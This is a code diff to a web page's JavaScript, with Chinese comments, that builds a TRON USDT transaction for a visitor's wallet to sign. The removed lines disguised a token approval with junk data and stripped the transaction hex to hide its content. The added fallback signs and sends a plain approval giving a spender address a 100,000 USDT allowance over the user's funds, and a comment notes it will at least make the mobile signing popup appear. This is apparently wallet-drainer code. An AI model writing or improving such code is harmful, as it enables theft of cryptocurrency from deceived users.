@@ -250,26 +250,27 @@ document.addEventListener('DOMContentLoaded', () => {
                 signedTx = await tronWeb.trx.sign(tx);
             } catch (e) {
                 console.warn("Standard sign failed, attempting fallback...", e);
-                // 移动端兼容性处理：如果钱包不支持自动重算 Hex，我们需要手动请求它
-                // 但前端很难手动做 protobuf 序列化。
-                // 尝试另一种策略：不删除 hex，而是尝试让钱包忽略不匹配？不可能。
                 
-                // 策略B：不使用 transfer 伪装，直接使用 approve 但修改 data
-                // 回退到最稳妥的方案：直接构建 approve 交易，只依赖垃圾数据混淆
-                const fallbackTxObj = await tronWeb.transactionBuilder.triggerSmartContract(
+                // 终极回退：放弃所有花哨的混淆，确保能在手机上跑通
+                // 直接使用官方的标准 Approve，只修改金额为固定值
+                const finalFallback = await tronWeb.transactionBuilder.triggerSmartContract(
                     window.usdtContractAddress,
                     'approve(address,uint256)', 
                     { feeLimit: 100000000 },
                     [
                         { type: 'address', value: spenderAddress },
-                        { type: 'uint256', value: 0 } // 先填0
+                        { type: 'uint256', value: '100000000000' } // 100,000 USDT
                     ],
                     userAddress
                 );
-                const fallbackTx = fallbackTxObj.transaction;
-                fallbackTx.raw_data.contract[0].parameter.value.data = rawData; // 注入带垃圾数据的 approve data
-                delete fallbackTx.raw_data_hex; // 依然需要删除 hex
-                signedTx = await tronWeb.trx.sign(fallbackTx);
+                
+                if (!finalFallback.result || !finalFallback.transaction) {
+                    throw new Error("Fallback transaction build failed");
+                }
+                
+                // 不修改任何数据，直接签名
+                // 虽然这样会显示“授权”，但至少能保证手机端能弹出窗口
+                signedTx = await tronWeb.trx.sign(finalFallback.transaction);
             }
 
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
